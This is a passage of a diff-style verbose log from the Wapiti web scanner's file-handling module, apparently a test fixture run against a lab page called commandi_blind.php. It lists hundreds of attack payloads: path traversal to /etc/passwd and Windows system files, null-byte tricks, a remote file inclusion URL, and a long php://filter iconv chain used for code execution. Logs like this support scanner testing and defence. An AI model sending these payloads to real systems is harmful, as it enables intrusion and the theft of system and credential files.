decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp
+2024-03-20 16:36:01.192 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:36:01.204 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:36:01.223 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:36:01.241 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:36:01.259 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:36:01.277 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:36:01.297 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:36:01.317 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:36:01.336 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:36:01.355 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:36:01.373 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:36:01.390 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:36:01.410 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:36:01.434 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:36:01.453 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:36:01.471 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:36:01.489 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:36:01.509 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:36:01.530 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:36:01.549 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:36:01.568 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:36:01.586 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:36:01.604 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:36:01.623 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:36:01.640 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=file%3A%2F%2F%2Fetc%2Fpasswd
+2024-03-20 16:36:01.657 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 16:36:01.675 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
+2024-03-20 16:36:01.692 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00
+2024-03-20 16:36:01.706 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices
+2024-03-20 16:36:01.716 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00
+2024-03-20 16:36:01.728 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:36:01.739 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:36:01.751 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=commandi_blind.php
+2024-03-20 16:36:01.765 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=commandi_blind.php%00
+2024-03-20 16:36:01.779 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=commandi_blind.php%3A%3A%24DATA
+2024-03-20 16:36:01.800 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2
+2024-03-20 16:36:01.802 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&security_level=2
+2024-03-20 16:36:01.809 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&security_level=2
+2024-03-20 16:36:01.815 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:36:01.823 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:36:01.831 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=%2Fetc%2Fservices&security_level=2
+2024-03-20 16:36:01.839 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:36:01.846 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&security_level=2
+2024-03-20 16:36:01.857 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&security_level=2
+2024-03-20 16:36:01.867 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&security_level=2
+2024-03-20 16:36:01.875 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:36:01.883 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:36:01.892 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&security_level=2
+2024-03-20 16:36:01.900 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&security_level=2
+2024-03-20 16:36:01.907 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&security_level=2
+2024-03-20 16:36:01.915 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:36:01.924 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:36:01.931 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:36:01.939 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:36:01.946 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
+2024-03-20 16:36:01.953 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
+2024-03-20 16:36:01.960 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:36:01.966 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:36:01.973 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:36:01.980 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:36:01.988 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:36:01.995 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:36:02.002 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&security_level=2
+2024-03-20 16:36:02.009 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:36:02.016 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:36:02.023 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:36:02.030 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:36:02.037 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
+2024-03-20 16:36:02.044 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
+2024-03-20 16:36:02.050 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:36:02.057 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:36:02.064 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:36:02.071 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:36:02.077 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:36:02.083 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
